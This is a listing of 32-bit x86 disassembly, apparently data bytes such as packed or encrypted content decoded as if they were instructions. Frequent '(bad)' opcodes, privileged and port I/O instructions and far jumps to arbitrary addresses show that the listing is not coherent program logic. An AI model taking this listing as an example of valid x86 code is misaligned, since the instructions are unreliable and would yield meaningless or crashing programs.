  41b1c2:	xchg   esi,eax
  41b1c3:	cmp    eax,eax
  41b1c5:	retf   0xa680
  41b1c8:	retf   0xddea
  41b1cb:	(bad)  [ebx+0x3c]
  41b1ce:	int3   
  41b1cf:	enter  0x5967,0x1e
  41b1d3:	mov    ds:0x2b6b76e3,al
  41b1d8:	int3   
  41b1d9:	push   esi
  41b1da:	sub    DWORD PTR [eax-0x787d8524],edx
  41b1e0:	cmp    al,0x9d
  41b1e2:	bound  edi,QWORD PTR [eax+0x53]
  41b1e5:	jp     0x41b1eb
  41b1e7:	cwde   
  41b1e8:	sub    DWORD PTR [edi+eiz*2+0x579984fb],edx
  41b1ef:	adc    dh,BYTE PTR ds:0x53f6e32d
  41b1f5:	mov    esp,0x871eb53d
  41b1fa:	retf   
  41b1fb:	adc    eax,0x97cc4e09
  41b200:	ret    
  41b201:	jl     0x41b18c
  41b203:	(bad)  
  41b204:	leave  
  41b205:	sub    DWORD PTR [ebx+0x3c],ecx
  41b208:	lea    edx,ds:0x6e62762b
  41b20e:	dec    ebp
  41b20f:	adc    BYTE PTR [ebx-0x25b516bf],dl
  41b215:	aad    0xde
  41b217:	sub    BYTE PTR [esi+0x3d093b24],ah
  41b21d:	js     0x41b1d4
  41b21f:	pop    eax
  41b220:	ds (bad) 
  41b222:	push   ebp
  41b223:	pop    ebp
  41b224:	or     DWORD PTR [esi-0x7247ac13],ebp
  41b22a:	stos   DWORD PTR es:[edi],eax
  41b22b:	loop   0x41b232
  41b22d:	push   ds
  41b22e:	jmp    0xd875b152
  41b233:	shl    BYTE PTR [ecx+0x6c241a05],cl
  41b239:	pop    ebp
  41b23a:	push   ebx
  41b23b:	push   cs
  41b23c:	outs   dx,DWORD PTR ds:[esi]
  41b23d:	popf   
  41b23e:	addr16 push ebp
  41b240:	xchg   esi,eax
  41b241:	arpl   WORD PTR [ecx+0xd3cd829],di
  41b247:	sbb    esp,edi
  41b249:	mov    edx,0xecab58e8
  41b24e:	and    eax,0x541e2b19
  41b253:	test   ax,0xcf00
  41b257:	call   0x2daa9d17
  41b25c:	mov    cl,0x1e
  41b25e:	(bad)  
  41b25f:	xor    al,0x0
  41b261:	out    0x7a,al
  41b263:	adc    edx,edi
  41b265:	enter  0xe54f,0xe3
  41b269:	fldcw  WORD PTR [esi-0x566f2bae]
  41b26f:	ret    
  41b270:	ss mov eax,0x76af6c05
  41b276:	retf   0x59b6
  41b279:	pop    ebx
  41b27a:	fst    DWORD PTR [esp+eiz*8+0x5088e08]
  41b281:	hlt    
  41b282:	aam    0x9d
  41b284:	cmp    ah,dl
  41b286:	mul    DWORD PTR [esi+0x51]
  41b289:	int    0x84
  41b28b:	out    0x38,eax
  41b28d:	jge    0x41b27b
  41b28f:	mov    ecx,0xf22f633a
  41b294:	sbb    dh,BYTE PTR [ebp-0x17ab7c00]
  41b29a:	xor    DWORD PTR [edi+0x5d],edi
  41b29d:	or     BYTE PTR [ebx],al
  41b29f:	shr    DWORD PTR [esp+edx*1],1
  41b2a2:	cwde   
  41b2a3:	dec    esp
  41b2a4:	dec    edx
  41b2a5:	jbe    0x41b300
  41b2a7:	cli    
  41b2a8:	adc    DWORD PTR [ecx-0x4e],ebx
  41b2ab:	adc    BYTE PTR [eax],dl
  41b2ad:	imul   BYTE PTR [ebx+0x5822e578]
  41b2b3:	outs   dx,DWORD PTR ds:[esi]
  41b2b4:	shr    BYTE PTR [ebx+0x6b],1
  41b2b7:	pop    eax
  41b2b8:	jg     0x41b2b1
  41b2ba:	add    eax,0x11d8b73f
  41b2bf:	and    eax,0x344c6e06
  41b2c4:	or     DWORD PTR [esi+0x12],0xa6d2074e
  41b2cb:	aas    
  41b2cc:	push   edi
  41b2cd:	ja     0x41b33e
  41b2cf:	mov    eax,ds:0x36fa6a46
  41b2d4:	sbb    DWORD PTR [ebp-0x29],eax
  41b2d7:	pop    ss
  41b2d8:	in     eax,dx
  41b2d9:	cli    
  41b2da:	pop    edx
  41b2db:	jle    0x41b2c5
  41b2dd:	mov    bl,0x14
  41b2df:	dec    esp
  41b2e0:	xchg   ecx,eax
  41b2e1:	(bad)  
  41b2e3:	mov    ds:0xbc9651f7,eax
  41b2e8:	mov    WORD PTR [ebp+0x28],fs
  41b2eb:	mov    al,ds:0xdab145b3
  41b2f0:	inc    bl
  41b2f2:	sbb    ah,BYTE PTR [edi]
  41b2f4:	sbb    eax,0x25a6a0a5
  41b2f9:	mov    BYTE PTR [eax],ah
  41b2fb:	into   
  41b2fc:	xor    eax,0x1e015459
  41b301:	shl    esi,cl
  41b303:	ficomp WORD PTR [bx+di+0x13ba]
  41b308:	inc    esp
  41b309:	push   eax
  41b30a:	sub    dl,al
  41b30c:	imul   esi,DWORD PTR [ebp-0x4d],0x57
  41b310:	jmp    0x5151:0x269273d2
  41b317:	or     ebx,DWORD PTR [ecx-0x316c0a93]
  41b31d:	or     ebx,ebx
  41b31f:	mov    ebx,0xb096067c
  41b324:	cmc    
  41b325:	sub    edi,ebx
  41b327:	mov    ecx,0x81e9623a
  41b32c:	or     ebx,esp
  41b32e:	dec    edi
  41b32f:	adc    eax,0x120cd2e9
  41b334:	mov    eax,0xe8840617
  41b339:	sti    
  41b33a:	mov    esi,0x9d8cb227
  41b33f:	mov    dh,0x55
  41b341:	in     al,dx
  41b342:	retf   0x11ad
  41b345:	jmp    0xcbad1933
  41b34a:	popa   
  41b34b:	ror    BYTE PTR [edx+0x42],cl
  41b34e:	and    eax,0x4b17277b
  41b353:	dec    esp
  41b354:	test   eax,0x41d6df03
  41b359:	mov    edx,0x73214959
  41b35e:	sub    dl,BYTE PTR [ebp+0x5f]
  41b361:	xchg   ebp,eax
  41b362:	add    esi,ecx
  41b364:	int    0xfe
  41b366:	or     BYTE PTR [esi],bl
  41b368:	pop    ds
  41b369:	lods   al,BYTE PTR ds:[esi]
  41b36a:	add    ch,BYTE PTR [eax+0x33]
  41b36d:	and    eax,0xba191ae6
  41b372:	xor    edx,DWORD PTR [eax+0x45]
  41b375:	imul   eax,DWORD PTR [ebx+ebx*8],0xffffffa9
  41b379:	rol    DWORD PTR [edx+0xb],1
  41b37c:	sub    dl,BYTE PTR [edx]
  41b37e:	bound  ebp,QWORD PTR [edx]
  41b380:	mov    ah,0xe7
  41b382:	ds stos DWORD PTR es:[edi],eax
  41b384:	outs   dx,DWORD PTR ds:[esi]
  41b385:	jbe    0x41b317
  41b387:	ror    BYTE PTR [esi+0x60],1
  41b38a:	dec    ebp
  41b38b:	jb     0x41b3e0
  41b38d:	jmp    DWORD PTR [edi+0x2c386fb0]
  41b393:	push   ebx
  41b394:	jnp    0x41b328
  41b396:	mov    DWORD PTR cs:[esi-0x6bbd2de],esi
  41b39d:	inc    edx
  41b39e:	in     al,dx
  41b39f:	adc    eax,0xf9742c7e
  41b3a4:	leave  
  41b3a5:	mov    eax,0xd223f58f
  41b3aa:	inc    edi
  41b3ab:	push   0xffffffbc
  41b3ad:	sbb    al,0x53
  41b3af:	mov    al,0xdb
  41b3b1:	mov    dl,0x5f
  41b3b3:	inc    edi
  41b3b4:	xchg   edx,eax
  41b3b5:	sub    bh,bh
  41b3b7:	inc    esi
  41b3b8:	mov    bh,0x75
  41b3ba:	pop    esp
  41b3bb:	retf   
  41b3bc:	test   al,0x6d
  41b3be:	sbb    DWORD PTR [esi+eax*1-0x6b],esp
  41b3c2:	and    bh,BYTE PTR [edi]
  41b3c4:	dec    esi
  41b3c5:	mov    bl,0xe6
  41b3c7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b3c8:	mov    esi,0x877b66b4
  41b3cd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b3ce:	int3   
  41b3cf:	push   esp
  41b3d0:	sbb    BYTE PTR [esp+ecx*8+0x29],bh
  41b3d4:	push   ss
  41b3d5:	and    eax,0xd4ab6455
  41b3da:	mov    ds:0x632692f2,eax
  41b3df:	jecxz  0x41b3d7
  41b3e1:	aaa    
  41b3e2:	ja     0x41b398
  41b3e4:	add    BYTE PTR [eax+0x713d9cb1],ah
  41b3ea:	or     al,0x43
  41b3ec:	dec    esp
  41b3ed:	test   BYTE PTR [edi],bl
  41b3ef:	sub    al,0x39
  41b3f1:	cdq    
  41b3f2:	je     0x41b41d
  41b3f4:	test   al,bh
  41b3f6:	(bad)  
  41b3f7:	je     0x41b391
  41b3f9:	lods   eax,DWORD PTR ds:[esi]
  41b3fa:	sbb    dl,bh
  41b3fc:	mov    DWORD PTR [ebx],esi
  41b3fe:	sub    edi,DWORD PTR [edi+0x47d89c8e]
  41b404:	enter  0x3214,0x4
  41b408:	jb     0x41b447
  41b40a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b40b:	out    dx,eax
  41b40c:	(bad)  
  41b40d:	sbb    DWORD PTR [ebp+0x4b6dca0f],ebp
  41b413:	retf   
  41b414:	xor    BYTE PTR [edx],bl
  41b416:	mov    ecx,0x283cadfd
  41b41b:	jmp    0x5cab6144
  41b420:	bound  edi,QWORD PTR [ebx-0x4724db11]
  41b426:	cmp    al,0x43
  41b428:	jmp    0x41b3eb
  41b42a:	lds    ebp,FWORD PTR [eax-0x46]
  41b42d:	mov    eax,0x82324dd8
  41b432:	pop    esi
  41b433:	rol    DWORD PTR [edx+ecx*2+0x44dcce9d],cl
  41b43a:	stos   BYTE PTR es:[edi],al
  41b43b:	clc    
  41b43c:	jg     0x41b47e
  41b43e:	nop
  41b43f:	iret   
  41b440:	cmp    eax,0x86ef9c22
  41b445:	adc    DWORD PTR [eax+esi*8-0x25],edi
  41b449:	pop    ss
  41b44a:	mov    bl,0x4e
  41b44c:	ins    DWORD PTR es:[edi],dx
  41b44d:	add    ecx,eax
  41b44f:	imul   edi,ebp,0xffffff90
  41b452:	stos   DWORD PTR es:[edi],eax
  41b453:	loopne 0x41b4cb
  41b455:	(bad)  
  41b456:	lock div ch
  41b459:	lahf   
  41b45a:	sub    BYTE PTR [edi-0x710d2ccd],bh
  41b460:	cmc    
  41b461:	mov    edi,0x37073355
  41b466:	mov    bl,0x27
  41b468:	dec    eax
  41b469:	sbb    ecx,DWORD PTR [esi+0x52]
  41b46c:	cvtps2pi mm5,QWORD PTR [eax]
  41b46f:	outs   dx,BYTE PTR ds:[esi]
  41b470:	lods   al,BYTE PTR ds:[esi]
  41b471:	add    ah,BYTE PTR [ebx-0x49]
  41b474:	xor    DWORD PTR [eax],ecx
  41b476:	sbb    BYTE PTR [ebp*2-0x30967318],0xd4
  41b47e:	pop    ecx
  41b47f:	int    0x93
  41b481:	gs cmp al,0xa0
  41b484:	jl     0x41b4e1
  41b486:	outs   dx,DWORD PTR ds:[esi]
  41b487:	retf   0xd03b
  41b48a:	ins    BYTE PTR es:[edi],dx
  41b48b:	mov    dh,0x8a
  41b48d:	scas   eax,DWORD PTR es:[edi]
  41b48e:	in     al,dx
  41b48f:	les    edx,FWORD PTR [esi+esi*1+0x1ab614a8]
  41b496:	jmp    DWORD PTR [eax+0x1d]
  41b499:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b49a:	pop    ebx
  41b49b:	dec    edx
  41b49c:	ss pop esp
  41b49e:	jp     0x41b511
  41b4a0:	add    eax,DWORD PTR [edi]
  41b4a2:	lock fidiv WORD PTR [edx-0x2e]
  41b4a6:	call   0xad541d7d
  41b4ab:	adc    bl,bh
  41b4ad:	sub    BYTE PTR [esi-0x57],bl
  41b4b0:	push   ecx
  41b4b1:	mov    WORD PTR [ecx],cs
  41b4b3:	repnz sahf 
  41b4b5:	cmp    edx,DWORD PTR [edi+0x59]
  41b4b8:	icebp  
  41b4b9:	push   edx
  41b4ba:	pop    eax
  41b4bb:	(bad)  
  41b4bc:	into   
  41b4bd:	mov    eax,0x6e319997
  41b4c2:	mov    ah,0x3c
  41b4c4:	mov    bh,0xde
  41b4c6:	xor    cl,BYTE PTR [ebp+0x42]
  41b4c9:	push   ds
  41b4ca:	lods   al,BYTE PTR fs:[esi]
  41b4cc:	inc    ecx
  41b4cd:	std    
  41b4ce:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b4cf:	stos   DWORD PTR es:[edi],eax
  41b4d0:	dec    ebx
  41b4d1:	pop    edi
  41b4d2:	cmp    eax,0x66c89b65
  41b4d7:	scas   al,BYTE PTR es:[edi]
  41b4d8:	in     al,dx
  41b4d9:	push   ds
  41b4da:	cmc    
  41b4db:	enter  0x1950,0x2a
  41b4df:	pop    eax
  41b4e0:	sub    eax,0x812e2866
  41b4e5:	sub    BYTE PTR [ecx],ch
  41b4e7:	sbb    dh,BYTE PTR [edx-0x6617f3d6]
  41b4ed:	ins    BYTE PTR es:[edi],dx
  41b4ee:	pop    ebx
  41b4ef:	jbe    0x41b4cd
  41b4f1:	mov    ?,eax
  41b4f3:	sub    ecx,ebx
  41b4f5:	ins    DWORD PTR es:[edi],dx
  41b4f6:	xchg   edx,eax
  41b4f7:	xor    eax,0x2f7b51e8
  41b4fc:	sbb    DWORD PTR [ecx],0xffffffc1
  41b4ff:	and    ebx,eax
  41b501:	in     al,0xf0
  41b503:	es pop ecx
  41b505:	int3   
  41b506:	mov    bl,0x93
  41b508:	and    al,0x67
  41b50a:	rep stos DWORD PTR es:[edi],eax
  41b50c:	xor    al,0x80
  41b50e:	mov    ch,0x4b
  41b510:	lds    eax,FWORD PTR [edx-0x1b001511]
  41b516:	push   cs
  41b517:	popf   
  41b518:	dec    edi
  41b519:	scas   eax,DWORD PTR es:[edi]
  41b51a:	(bad)  
  41b51b:	sub    esi,DWORD PTR [edx]
  41b51d:	lds    ebp,FWORD PTR [ebp-0x3a]
  41b520:	or     bh,BYTE PTR [ebx+ebp*8-0x6]
  41b524:	jg     0x41b4dc
  41b526:	jb     0x41b4f9
  41b528:	dec    edx
  41b529:	xor    bl,bh
  41b52b:	stos   BYTE PTR es:[edi],al
  41b52c:	retf   
  41b52d:	inc    ecx
  41b52e:	sbb    al,0xd0
  41b530:	out    dx,eax
  41b531:	mov    ebp,0x7071b361
  41b536:	shl    BYTE PTR [ecx],0xf2
  41b539:	mov    edx,0xec53faa9
  41b53e:	stos   BYTE PTR es:[edi],al
  41b53f:	out    0x7e,eax
  41b541:	add    DWORD PTR [esi-0x50],ebx
  41b544:	shl    DWORD PTR [esi+0x408b871f],1
  41b54a:	(bad)  
  41b54c:	xchg   BYTE PTR ds:0x3a5af48e,dl
  41b552:	push   0xffffffc6
  41b554:	inc    ebx
  41b555:	fwait
  41b556:	sahf   
  41b557:	dec    edi
  41b558:	je     0x41b4f6
  41b55a:	clc    
  41b55b:	jnp    0x41b50a
  41b55d:	add    al,0xc5
  41b55f:	loope  0x41b577
  41b561:	push   edx
  41b562:	mov    bh,0x87
  41b564:	and    BYTE PTR [esi-0x304fec4e],cl
  41b56a:	mov    ebp,0xb5c69353
  41b56f:	mov    bh,BYTE PTR [esi+0x206ac064]
  41b575:	pop    ss
  41b576:	pushf  
  41b577:	push   ebp
  41b578:	or     al,0x53
  41b57a:	data16 cmp al,0x89
  41b57d:	(bad)  
  41b57e:	xor    BYTE PTR [eax+ebx*1-0x642d3b79],bl
  41b585:	and    eax,0xb4ae4fbf
  41b58a:	push   edi
  41b58b:	sub    ch,BYTE PTR [ebx-0x2012c85f]
  41b591:	aam    0xa4
  41b593:	mov    eax,ecx
  41b595:	adc    eax,0x496fee15
  41b59a:	mov    eax,0x91999d15
  41b59f:	jns    0x41b539
  41b5a1:	jo     0x41b55d
  41b5a3:	push   ebx
  41b5a4:	jo     0x41b552
  41b5a6:	mov    ebp,0x18f32a70
  41b5ab:	xchg   ebp,eax
  41b5ac:	cdq    
  41b5ad:	jp     0x41b5f2
  41b5af:	and    DWORD PTR [ecx+0x75],ebp
  41b5b2:	ins    BYTE PTR es:[edi],dx
  41b5b3:	aaa    
  41b5b4:	dec    ebp
  41b5b5:	mov    dl,0x32
  41b5b7:	rcl    DWORD PTR [eax-0x5b177a09],1
  41b5bd:	push   edx
  41b5be:	dec    edi
  41b5bf:	and    ebx,esi
  41b5c1:	jg     0x41b5e2
  41b5c3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b5c4:	loop   0x41b609
  41b5c6:	dec    esp
  41b5c7:	out    0xd6,al
  41b5c9:	sub    al,bh
  41b5cb:	in     al,0xf8
  41b5cd:	ret    0x123a
  41b5d0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b5d1:	pop    esi
  41b5d2:	add    DWORD PTR [edi],0xad149d10
  41b5d8:	rcr    bh,0xd3
  41b5db:	xor    esi,DWORD PTR [edx+edi*1]
  41b5de:	ss xchg edx,eax
  41b5e0:	dec    edx
  41b5e1:	fild   WORD PTR [esi]
  41b5e3:	mov    ebp,0xa886be6f
  41b5e8:	(bad)  
  41b5e9:	fadd   st,st(1)
  41b5eb:	popf   
  41b5ec:	fld    QWORD PTR [edi+0x69]
  41b5ef:	imul   cl
  41b5f1:	outs   dx,BYTE PTR ds:[esi]
  41b5f2:	add    ch,0xc1
  41b5f5:	adc    DWORD PTR [edx-0x54],ebp
  41b5f8:	sahf   
  41b5f9:	scas   eax,DWORD PTR es:[edi]
  41b5fa:	ficomp WORD PTR [ebp+0x676d0f47]
  41b600:	fs (bad) 
  41b602:	pop    eax
  41b603:	in     eax,0xfc
  41b605:	jp     0x41b5ac
  41b607:	jle    0x41b5ff
  41b609:	dec    eax
  41b60a:	cli    
  41b60b:	or     dh,dl
  41b60d:	or     cl,BYTE PTR [ebx+0x7c]
  41b610:	arpl   WORD PTR ds:0xa7521ff4,bx
  41b616:	fidiv  WORD PTR [eax+esi*2]
  41b619:	push   0xffffff8b
  41b61b:	rcl    BYTE PTR [ecx+0x59db8e0b],0xb1
  41b622:	out    0xfb,al
  41b624:	lds    esi,FWORD PTR [ecx+0x7206be99]
  41b62a:	adc    DWORD PTR [ebp+0x2d],0x3ce21ad0
  41b631:	and    ebx,DWORD PTR [ecx]
  41b633:	mov    DWORD PTR [ebx],esp
  41b635:	inc    esp
  41b636:	mov    eax,0x924749ed
  41b63b:	es mov esp,0xc6f4fffd
  41b641:	ret    0xe167
  41b644:	mov    ebx,0x5f2fb031
  41b649:	mov    ebx,0x90069064
  41b64e:	loope  0x41b655
  41b650:	pop    ebx
  41b651:	push   ecx
  41b652:	jno    0x41b682
  41b654:	dec    edi
  41b655:	pxor   mm3,QWORD PTR ds:0xb5704800
  41b65c:	aam    0xe
  41b65e:	lahf   
  41b65f:	nop
  41b660:	cli    
  41b661:	js     0x41b65c
  41b663:	jne    0x41b6af
  41b665:	sar    BYTE PTR [eax],0xdd
  41b668:	mov    DWORD PTR [ecx+0x51bd1dd1],edx
  41b66e:	aad    0xc0
  41b670:	lods   al,BYTE PTR ds:[esi]
  41b671:	sub    eax,0x62f724f3
  41b676:	xchg   esp,eax
  41b677:	ret    
  41b678:	inc    esp
  41b679:	cdq    
  41b67a:	cli    
  41b67b:	xor    eax,0xcff9746f
  41b680:	test   al,0x11
  41b682:	aam    0xf2
  41b684:	push   ebp
  41b685:	cwde   
  41b686:	add    DWORD PTR [edx],ecx
  41b688:	dec    ebp
  41b689:	shl    DWORD PTR [edx+ebx*8-0x6c80d91a],0xe9
  41b691:	inc    edi
  41b692:	add    edi,ebp
  41b694:	jo     0x41b708
  41b696:	sbb    BYTE PTR [eax],al
  41b698:	imul   BYTE PTR [edx+ebp*2+0x2b]
  41b69c:	popa   
  41b69d:	jbe    0x41b6c8
  41b69f:	fisub  WORD PTR [ebx-0x5eb55869]
  41b6a5:	jl     0x41b6ee
  41b6a7:	in     eax,dx
  41b6a8:	mov    al,ds:0xe034cdd
  41b6ad:	sahf   
  41b6ae:	sbb    eax,DWORD PTR [esi-0x13415036]
  41b6b4:	ror    DWORD PTR [edi],0x2a
  41b6b7:	xchg   edi,eax
  41b6b8:	inc    esi
  41b6b9:	or     eax,0xe4b46a1b
  41b6be:	(bad)  
  41b6bf:	mov    al,0x40
  41b6c1:	pushf  
  41b6c2:	test   al,dh
  41b6c4:	adc    DWORD PTR [edi],edx
  41b6c6:	cmc    
  41b6c7:	out    0x93,eax
  41b6c9:	jecxz  0x41b732
  41b6cb:	in     eax,0x8b
  41b6cd:	or     bh,cl
  41b6cf:	mov    BYTE PTR [ebx-0x68d8b09e],bh
  41b6d5:	mov    ?,WORD PTR [ebx-0x10]
  41b6d8:	outs   dx,BYTE PTR ds:[esi]
  41b6d9:	or     al,0x61
  41b6db:	(bad)  
  41b6dc:	sbb    esi,DWORD PTR [eax-0x17]
  41b6df:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b6e0:	out    0x60,eax
  41b6e2:	inc    ecx
  41b6e3:	std    
  41b6e4:	retf   0x67d3
  41b6e7:	mov    esp,0x8ff75dc7
  41b6ec:	hlt    
  41b6ed:	jnp    0x41b68a
  41b6ef:	jge    0x41b6b4
  41b6f1:	inc    eax
  41b6f2:	adc    ebx,DWORD PTR [ecx]
  41b6f4:	xchg   edx,eax
  41b6f5:	aaa    
  41b6f6:	dec    esi
  41b6f7:	mul    ch
  41b6f9:	pop    edx
  41b6fa:	xor    ebp,ebp
  41b6fc:	shl    BYTE PTR [eax],0xa6
  41b6ff:	mov    ebx,0xfe82f6e2
  41b704:	scas   al,BYTE PTR es:[edi]
  41b705:	repz push sp
  41b708:	dec    ebx
  41b709:	push   es
  41b70a:	in     al,0x8d
  41b70c:	pop    esi
  41b70d:	fucomi st,st(6)
  41b70f:	loope  0x41b75a
  41b711:	or     eax,0xa09660
  41b716:	mov    al,ds:0x448de72
  41b71b:	mov    edi,DWORD PTR [eax+0x79]
  41b71e:	icebp  
  41b71f:	call   0xbe30:0x647f5ae
  41b726:	xchg   BYTE PTR [eax+0x52],dh
  41b729:	add    eax,0x4616a2d1
  41b72e:	enter  0x7028,0x5c
  41b732:	xchg   DWORD PTR [edx+ebx*4],eax
  41b735:	pop    ds
  41b736:	pop    ds
  41b737:	mov    cl,0xff
  41b739:	pop    ebx
  41b73a:	inc    esp
  41b73b:	xor    bh,BYTE PTR [bp+si+0x57]
  41b73f:	jns    0x41b6d6
  41b741:	js     0x41b74c
  41b743:	outs   dx,DWORD PTR ds:[esi]
  41b744:	(bad)  [eax]
  41b746:	pop    eax
  41b747:	sti    
  41b748:	inc    eax
  41b749:	mov    BYTE PTR [ecx-0x4aab366b],0xbd
  41b750:	in     al,0xe2
  41b752:	enter  0xb628,0xa3
  41b756:	xor    esp,eax
  41b758:	xchg   BYTE PTR [edi],dh
  41b75a:	jge    0x41b78d
  41b75c:	mov    ebp,0x306c5414
  41b761:	(bad)  
  41b762:	and    BYTE PTR [eax],al
  41b764:	cmp    eax,0x895d0740
  41b769:	call   DWORD PTR [ebp+0x72af39ee]
  41b76f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b770:	repnz mov ah,cl
  41b773:	push   ss
  41b774:	repz adc DWORD PTR [edx-0x3],ecx
  41b778:	daa    
  41b779:	xor    ebp,DWORD PTR [edx-0x30]
  41b77c:	iret   
  41b77d:	add    ebx,0xffffff82
  41b780:	aaa    
  41b781:	jecxz  0x41b7ba
  41b783:	xor    bl,BYTE PTR [eax+ecx*1-0x7d]
  41b787:	lods   al,BYTE PTR ds:[esi]
  41b788:	mov    cl,0xaa
  41b78a:	aad    0xa
  41b78c:	addr16 jge 0x41b7e3
  41b78f:	push   eax
  41b790:	into   
  41b791:	test   cl,ah
  41b793:	mov    ch,0xff
  41b795:	cli    
  41b796:	jne    0x41b73b
  41b798:	xchg   ecx,eax
  41b799:	in     eax,dx
  41b79a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b79b:	xchg   esp,eax
  41b79c:	hlt    
  41b79d:	cmp    eax,0x763779e7
  41b7a2:	push   0xffffffc8
  41b7a4:	inc    ebp
  41b7a5:	js     0x41b825
  41b7a7:	(bad)  
  41b7a8:	adc    edi,edx
  41b7aa:	cmp    BYTE PTR [edx],0x91
  41b7ad:	imul   esp,DWORD PTR [edi+0x3d0c128],0xcc356df8
  41b7b7:	inc    esi
  41b7b8:	loopne 0x41b81a
  41b7ba:	push   esp
  41b7bb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b7bc:	arpl   WORD PTR gs:[ebx+0x40],di
  41b7c0:	mov    ah,0x61
  41b7c2:	add    cl,cl
  41b7c4:	outs   dx,BYTE PTR ds:[esi]
  41b7c5:	scas   eax,DWORD PTR es:[edi]
  41b7c6:	add    BYTE PTR cs:[esi],cl
  41b7c9:	sbb    eax,0x1412b1cf
  41b7ce:	add    edx,DWORD PTR [eax]
  41b7d0:	sub    ah,dh
  41b7d2:	push   edx
  41b7d3:	jmp    0xbfa41c97
  41b7d8:	arpl   WORD PTR [ecx-0x62f4c62a],cx
  41b7de:	ret    
  41b7df:	fcmovu st,st(1)
  41b7e1:	mov    ah,al
  41b7e3:	or     bl,BYTE PTR [esi+ebx*1+0x71e08758]
  41b7ea:	or     eax,0x7121dbbe
  41b7ef:	nop
  41b7f0:	inc    esp
  41b7f1:	mov    DWORD PTR [edx],eax
  41b7f3:	ret    0x9760
  41b7f6:	jae    0x41b7e8
  41b7f8:	inc    esp
  41b7f9:	add    esp,DWORD PTR [eax]
  41b7fb:	jle    0x41b78e
  41b7fd:	iret   
  41b7fe:	inc    esi
  41b7ff:	(bad)  
  41b800:	fwait
  41b801:	(bad)  
  41b802:	callw  0x1f77
  41b806:	cmp    eax,0x58
  41b809:	sbb    DWORD PTR [ebx+0x1e],ecx
  41b80c:	mov    ch,0x3a
  41b80e:	adc    eax,0xe075c48
  41b813:	mov    eax,0x8e78b98c
  41b818:	inc    eax
  41b819:	sub    al,BYTE PTR ds:[ebp+edi*8+0x38]
  41b81e:	shr    DWORD PTR [edx-0x1cf9ccae],cl
  41b824:	xor    ch,BYTE PTR [ebx+ebx*8+0x1f]
  41b828:	scas   eax,DWORD PTR es:[edi]
  41b829:	dec    sp
  41b82b:	and    esp,DWORD PTR [edi+0x3dfdc1e3]
  41b831:	xor    bh,al
  41b833:	out    dx,eax
  41b834:	or     esp,DWORD PTR [ebx-0x71]
  41b837:	adc    BYTE PTR [esi],bl
  41b839:	mov    BYTE PTR [edx+0x5f9a3baf],al
  41b83f:	xchg   DWORD PTR [eax-0x7c],edx
  41b842:	pop    eax
  41b843:	mov    eax,ds:0x32658c85
  41b848:	aam    0x2f
  41b84a:	dec    ebp
  41b84b:	mov    esp,0x226bc8ce
  41b850:	xchg   esi,eax
  41b851:	mov    bh,0x78
  41b853:	or     eax,0x260cbe94
  41b858:	mov    dl,0xc5
  41b85a:	test   al,0xf9
  41b85c:	test   DWORD PTR ds:0xfb9d8c05,edx
  41b862:	push   eax
  41b863:	leave  
  41b864:	xchg   esp,eax
  41b865:	mov    ebx,0xbb24a692
  41b86a:	fwait
  41b86b:	sar    DWORD PTR [ebp+0x78d48c4],cl
  41b871:	adc    DWORD PTR ds:0x18b30bf3,0xc642b518
  41b87b:	clc    
  41b87c:	ja     0x41b845
  41b87e:	adc    ebp,ebx
  41b880:	sbb    edx,DWORD PTR [esi+0x1d]
  41b883:	cmp    ah,BYTE PTR [edi+0x2659c58]
  41b889:	jmp    0x41b883
  41b88b:	outs   dx,BYTE PTR ds:[esi]
  41b88c:	aad    0xf4
  41b88e:	fwait
  41b88f:	or     DWORD PTR [eax-0x61],0x23
  41b893:	arpl   si,cx
  41b895:	jmp    0x3ef9:0x124c03cb
  41b89c:	cmp    BYTE PTR [ebp+edx*2+0x4c],ch
  41b8a0:	or     al,0x97
  41b8a2:	xor    esp,edx
  41b8a4:	mov    eax,0x2699cc4
  41b8a9:	xor    BYTE PTR [edx-0x578d5fbf],dh
  41b8af:	mov    ds,WORD PTR [edx-0x41f2ec38]
  41b8b5:	repz jmp 0x41b896
  41b8b8:	dec    eax
  41b8b9:	addr16 push ss
  41b8bb:	xchg   BYTE PTR [ecx],dh
  41b8bd:	pop    ebp
  41b8be:	dec    edx
  41b8bf:	xchg   edi,eax
  41b8c0:	mov    edx,0xd8cd0910
  41b8c5:	(bad)  [ebx-0x22]
  41b8c8:	sbb    al,BYTE PTR [ebx]
  41b8ca:	gs cmp al,0xfc
  41b8cd:	outs   dx,DWORD PTR ds:[esi]
  41b8ce:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b8cf:	aam    0x7
  41b8d1:	test   DWORD PTR [eax],ecx
  41b8d3:	inc    ecx
  41b8d4:	sub    cl,BYTE PTR [ecx-0x227ec4b]
  41b8da:	ds mov ?,esp
  41b8dd:	out    0xc8,eax
  41b8df:	icebp  
  41b8e0:	sub    BYTE PTR ds:0xeb28cd7,0xb1
  41b8e7:	jno    0x41b8dc
  41b8e9:	xchg   ebx,eax
  41b8ea:	or     eax,0xd25e1c75
  41b8ef:	xor    ecx,DWORD PTR [edi+0x55]
  41b8f2:	mov    bl,0x17
  41b8f4:	rcr    ch,0x24
  41b8f7:	mov    esp,0x4da869db
  41b8fc:	or     esp,edi
  41b8fe:	adc    DWORD PTR [ebx],ecx
  41b900:	push   cs
  41b901:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b902:	xchg   ecx,eax
  41b903:	lds    edx,FWORD PTR [ecx+0x66da0155]
  41b909:	cmp    bl,BYTE PTR [ebp+0x5f2f933e]
  41b90f:	pop    es
  41b910:	fwait
  41b911:	mov    WORD PTR [edi-0x21],?
  41b914:	cld    
  41b915:	int3   
  41b916:	jne    0x41b95b
  41b918:	push   ds
  41b919:	add    eax,0x8c0a12d5
  41b91e:	shr    DWORD PTR [ebp-0x72],cl
  41b921:	scas   eax,DWORD PTR es:[edi]
  41b922:	retf   0xde7f
  41b925:	xchg   esi,eax
  41b926:	push   esp
